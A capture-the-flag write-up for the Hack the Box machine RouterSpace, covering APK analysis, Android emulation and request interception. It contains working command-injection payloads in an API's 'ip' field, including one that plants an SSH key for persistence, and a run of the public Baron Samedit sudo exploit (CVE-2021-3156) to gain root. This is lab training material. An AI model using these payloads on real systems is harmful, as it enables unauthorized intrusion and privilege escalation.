# RouterSpace
**Date:** February 3rd 2022

**Author:** j.info

**Link:** [**RouterSpace**](https://app.hackthebox.com/machines/444) CTF on Hack the Box

**Hack the Box Difficulty Rating:** Easy

<br>

## Objectives
- User own
- Root own

<br>

## Initial Enumeration

<br>

### Nmap Scan

`sudo nmap -sC -sV -A -T4 10.129.142.64`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
80/tcp open  http
|_http-title: RouterSpace
|_http-trane-info: Problem with XML parsing of /evox/about
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-46800
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 76
|     ETag: W/"4c-kk1J/XKwnB0TB/ixH9p8Umq3otU"
|     Date: Sat, 26 Feb 2022 21:30:31 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: f YU Pk Cl Ed 18QFNFEw }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-50411
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Sat, 26 Feb 2022 21:30:30 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-32113
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Sat, 26 Feb 2022 21:30:30 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
```

<br>

### Gobuster Scan

A gobuster scan was not required to complete this CTF.

<br>

## Website Digging

Looking around the website none of the links actually do anything other than the download link you find on several parts of the page. That will allow you to download a file called **RouterSpace.apk**.

<br>

## APK Analysis

You can rename the .apk file to .zip and then extract the files to look at.

Once you've done that you'll notice a file called **classes.dex** which can be decompiled into source code. I did this using **dex-tools-2.1** which can be found [**here**](https://github.com/pxb1988/dex2jar/releases)

You can also use an online apk decompiler [**here**](http://www.javadecompilers.com/apk)

You'll end up with a lot of source code and I didn't end up finding any credentials or anything overly useful other than an API we'll end up using in a minute.

<br>

## Android Emulation

This was a very frustrating part of this box and it took quite awhile to get the emulator working correctly. I first tried **Android SDK** but no matter what I did it wouldn't work correctly. I then installed and setup **Anbox** which ended up working, but only after google searching how to fix multiple issues that popped up.

You'll also need to install **adb**:

`sudo apt install adb`

```
./adb install RouterSpace.apk
adb server is out of date.  killing...
* daemon started successfully *
3361 KB/s (35855082 bytes in 10.416s)
   pkg: /data/local/tmp/RouterSpace.apk
Success
```

Once you have that installed and Anbox working you can run the following:

`adb install RouterSpace.apk`

The RouterSpace app will now show up inside of Anbox.

<br>

## App Testing

Launch **Anbox** with the following command:

`anbox.appmgr`

Then find and launch the RouterSpace app. You'll see a few initial screens that you can click next on until you get to the final screen with a **Check Status** button. When clicking it you'll get an error message for now.

We'll want to capture the requests from the app in **burp** and in order to do that we'll have to configure Anbox to send it there via proxy like this:

`adb shell settings put global http_proxy 127.0.0.1:8080`

`adb reverse tcp:8080 tcp:8080`

Launch burp with intercept on and click the **Check Status** button in the RouterSpace app to capture the request.

Send the request over to the repeater. It should look like this:

```
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 16
Host: routerspace.htb
Connection: close
Accept-Encoding: gzip, deflate

{"ip":"0.0.0.0"}
```

After experimenting I find that we have command injection capabilities on the "ip" line. Modify the request like so and send it through, then look at the request response:

```
"ip":"0.0.0.0;cat /etc/passwd"
```

You'll get a list of users back if everything was done correctly.

If you do the same thing with command **whoami** you'll see that you're running as user **paul**.

At this point I set up a **nc listener** on my system and tried multiple different methods of getting a reverse shell back, but none of them were successful no matter if it were in php, perl, bash, etc. So it's likely there's a firewall blocking reverse shells.

To get around that I ended up creating an **authorized_keys** file in the **paul** home directory and adding my own **public rsa key** to it, then connected over via **ssh**. You can do that like this:

"ip":"0.0.0.0;touch /home/paul/.ssh/authorized_keys"

"ip":"0.0.0.0;echo 'Your public SA key' > /home/paul/.ssh/authorized_keys"

`ssh paul@10.10.11.148 `

<br>

## System Access

Now that we have that set I connect over through **ssh** and successfully login as **paul**:

```
Enter passphrase for key '/home/kali/.ssh/id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 03 Mar 2022 04:36:03 PM UTC

  System load:           0.0
  Usage of /:            71.4% of 3.49GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             215
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.148
  IPv6 address for eth0: dead:beef::250:56ff:feb9:3e61


80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133
paul@routerspace:~$
```

<br>

## System Enumeration

In the paul home directory you can find **user.txt** for your user own objective. A note that you could have also sent a request in burp to cat this previously before connecting to the system.

I look around his home directory but don't find anything. I check **/opt** and there isn't anything there either. I look for **SUID** set files, as well as any files with **capabilities** we can exploit and don't find anything. No cron jobs set either.

I decide to run **linpeas** at this point and while it doesn't have anything that blatantly sticks out in orange/red, there are several things in red.

Looking through them I find that the **sudo version** is 1.8.31 which appears to be vulnerable to the **Baron Samedit** aka **CVE-2021-3156** exploit.

I navigate over to [**this Github repository**](https://github.com/CptGibbon/CVE-2021-3156) and it mentions that if you run the following command and it asks for a password the system is probably vulnerable:

`sudoedit -s Y`

```
[sudo] password for paul:
```

<br>

## Root

It looks like we're good to give this exploit a shot. I download the files in the repository over to the target system and build the exploit, then run it:

```
paul@routerspace:/tmp/test$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
paul@routerspace:/tmp/test$ ls
exploit  exploit.c  libnss_x  Makefile  shellcode.c
paul@routerspace:/tmp/test$ ./exploit
# whoami
root
# ls
Makefile  exploit  exploit.c  libnss_x  shellcode.c
# cat /root/root.txt
```

And with that we have root and have completed this CTF. Go get the **root.txt** file!

<br>

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration using **nmap**
- Working with **Android APK** files
- Using **Anbox** Android emulator to run the APK file
- Configuring **burp** to capture requests from Anbox
- Using **command injection** to exploit the API and gain a foothold on the system
- Taking advantaged of the **Baron Samedit CVE** to exploit a vulnerability in **sudo** and escalate to root

<br>

Many thanks to:
- [**h4rithd**](https://app.hackthebox.com/users/550483) for creating this CTF.
- **Hack the Box** for hosting this CTF.

<br>

You can visit them at: [**https://www.hackthebox.com**](https://www.hackthebox.com)
